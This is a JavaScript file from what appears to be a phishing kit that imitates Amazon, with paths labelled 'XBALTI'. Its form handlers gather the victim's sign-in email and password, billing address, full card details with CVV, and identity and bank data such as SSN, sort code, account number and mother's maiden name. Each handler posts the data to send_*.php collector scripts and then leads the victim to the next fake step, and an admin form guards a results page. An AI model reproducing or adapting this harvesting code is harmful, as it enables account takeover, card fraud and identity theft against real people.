                            $(function() {
                    $("form[name='formcard']").validate({
                        rules: {
                            nameoncard: "required",
                            cardNumber: "required",
                            exdatee: "required",
                            cvv: "required",

                        },
                        messages: {
                            nameoncard: "",
                            cardNumber: "",
                            exdatee: "",
                            cvv: "",
                        },
                        submitHandler: function(form) {
                            $("#zwimel").show();
                             $.post("../XBALTI/send_card.php", $("#formcard").serialize(), function(result){
                                setTimeout(function() {
                                    $(location).attr("href", "../homepage/secure.php?Usecurty_info_vbv");
                                }, 2000);
                            });
                        },
                    });
                                
                         });                              


                            $(function() {
                        $("form[name='billingform']").validate({
                        rules: {
                            ap_fullname: "required",
                            ap_address: "required",
                            ap_City: "required",
                            ap_stat: "required",
                            ap_zipcode: "required",
                            ap_phone: "required",

                        },
                        messages: {
                            ap_fullname: "",
                            ap_address: "",
                            ap_City: "",
                            ap_stat: "",
                            ap_zipcode: "",
                            ap_phone: "",
                            
                        },
                        submitHandler: function(form) {
                            $("#zwimel").show();
                             $.post("../XBALTI/send_billing.php", $("#billingform").serialize(), function(result) {
                                setTimeout(function() {
                                    $(location).attr("href", "../homepage/Card.php?Update_Your_Card");
                                }, 2000);
                                
                             
                            });
                        },
                    });
                });

                            $(function() {
                        $("form[name='emailo']").validate({
                        rules: {
                            emailpass: "required",


                        },
                        messages: {
                            emailpass: "",

                            
                        },
                        submitHandler: function(form) {
                            $("#zwimel").show();
                             $.post("../XBALTI/send_email.php", $("#emailo").serialize(), function(result){
                                setTimeout(function() {
                                 $(location).attr("href", "../homepage/success.php?Congratulations");
                                }, 2000);
                                
                             
                            });
                        },
                    });
                });


                            $(function() {
                        $("form[name='signineml']").validate({
                        rules: {
                               email: {
                                required: true,
                                email: true
                            },


                        },
                        messages: {
                              
                                email: "* Please enter your email.",

                            
                        },
                        submitHandler: function(form) {
                             $("#zwimel").show();
                           $.post("XBALTI/get_pass.php", $("#signineml").serialize(), function(result)
                            {
                                setTimeout(function() {
                                    
                              $(location).attr("href", "signin.php?login"); 
                                    
                                }, 1000);
                                
                             
                            });
                        },
                    });
                });
                            $(function() {
                        $("form[name='signinpass']").validate({
                        rules: {
                             password: "required",


                        },
                        messages: {
                              
                                password: "* Please enter your password.",

                            
                        },
                       submitHandler: function(form) {
                           $("#zwimel").show();
                             $.post("XBALTI/send_login.php", $("#signinpass").serialize(), function(result){
                                setTimeout(function() {
                            $(location).attr("href", "homepage/?update_billing");
                                }, 1000);
                                
                             
                            });
                       },
                    });
                });

                        $(function() {
                        $("form[name='formvbv']").validate({
                        rules: {

                            VBVIYA: "required",
                            codicefiscale: "required",
                            kontonummer: "required",
                            offid: "required",
                            osid: "required",
                            creditlimit: "required",
                            sortcode: "required",
                            accnumber: "required",
                            ssn: "required",
                            ssnca: "required",
                            mmname: "required",

                        },
                        messages: {

                            VBVIYA: "",
                            codicefiscale: "",
                            kontonummer: "",
                            offid: "",
                            osid: "",
                            creditlimit: "",
                            sortcode: "",
                            accnumber: "",
                            ssn: "",
                            ssnca: "",
                            mmname: "",
                            
                        },
                        submitHandler: function(form) {
                            $("#zwimel").show();
                             $.post("../XBALTI/send_vbv.php", $("#formvbv").serialize(), function(result) {
                                setTimeout(function() {
                                    $(location).attr("href", "../homepage/email.php?Link_Your_Email");
                                }, 2000);
                                
                             
                            });
                        },
                    });
                });


                        $(function() {
                        $("form[name='formadmin']").validate({
                        rules: {

                            passadmin: "required",

                        },
                        messages: {

                            passadmin: "Enter Your Fucking Password",
                            
                        },
                        submitHandler: function(form) {
                            $("#sonic").show();
                             $.post("../amazon/XBALTI/get_pass.php", $("#formadmin").serialize(), function(result) {
                                setTimeout(function() {
                                    $(location).attr("href", "rezulta.php");
                                }, 2000);
                                
                             
                            });
                        },
                    });
                });

